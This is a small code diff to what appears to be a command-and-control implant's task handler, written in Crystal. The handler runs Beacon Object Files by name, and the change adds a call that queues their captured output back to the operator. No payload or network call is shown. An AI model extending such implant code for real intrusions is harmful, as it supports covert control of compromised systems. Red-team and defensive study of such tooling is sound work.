@@ -10,7 +10,7 @@ module Dark::Agent::Commands
     def execute(task : JSON::Any) : Nil
       task_id = task["id"]?.try(&.as_s) || ""
       bof_name = task["parameters"]["name"]?.try(&.as_s) || ""
-      
+
       # Check for bof_args_str first (single string), then bof_args (split string)
       bof_args = if bof_args_str = task["parameters"]["bof_args_str"]?.try(&.as_s)
         bof_args_str.empty? ? [] of String : [bof_args_str]
@@ -28,11 +28,9 @@ module Dark::Agent::Commands
       # Execute the BOF in a protected thread to prevent crashes
       result = bof_registry.execute(bof_name, bof_args, task_id: task_id)
 
-      # Get the captured output
+      # Queue success response
       output = Dark::ELF::Callbacks.get_and_clear_output
-      
-      # Note: We don't queue a success response here because the output is handled
-      # by the BOF execution system and callbacks
+      MessageHandler.add_response(task_id, :success, output)
     end
   end
 end
